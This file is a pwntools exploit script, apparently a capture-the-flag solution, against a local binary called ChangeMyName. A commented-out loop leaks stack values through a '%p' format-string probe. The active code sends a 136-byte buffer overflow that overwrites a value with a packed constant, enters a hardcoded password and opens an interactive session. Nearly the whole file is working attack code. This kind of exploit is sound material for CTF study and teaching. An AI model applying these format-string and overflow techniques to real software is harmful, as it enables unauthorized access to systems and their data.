from pwn import * 

context.binary = binary = ELF("./ChangeMyName")
context.log_level = 'debug'

# for i in range(1,200):
#     p = process(binary.path)
#     p.recvuntil(b'choice > ')

#     p.sendline(b'1')
#     p.recvuntil(b'name: ')
#     p.sendline(f'%{i}$p'.encode())
#     p.recvuntil(b'Welcome, ')
#     data = p.recvline().strip().decode()
#     try:
#         leak = int(data,16)

#         print(f'{i}: {p64(leak)}')
#         p.close()
#     except:
#         print(f'{i}: {data}')
#         p.close
admin  = 0x466177617a

p = process(binary.path)
p.recvuntil(b'choice > ')
p.sendline(b'1')
p.recvuntil(b'name: ')
payload = b"A" * 136 + p64(admin)
p.sendline(payload)
p.recvuntil(b'password: \n')
p.sendline(b'UIIAIAU')

p.interactive()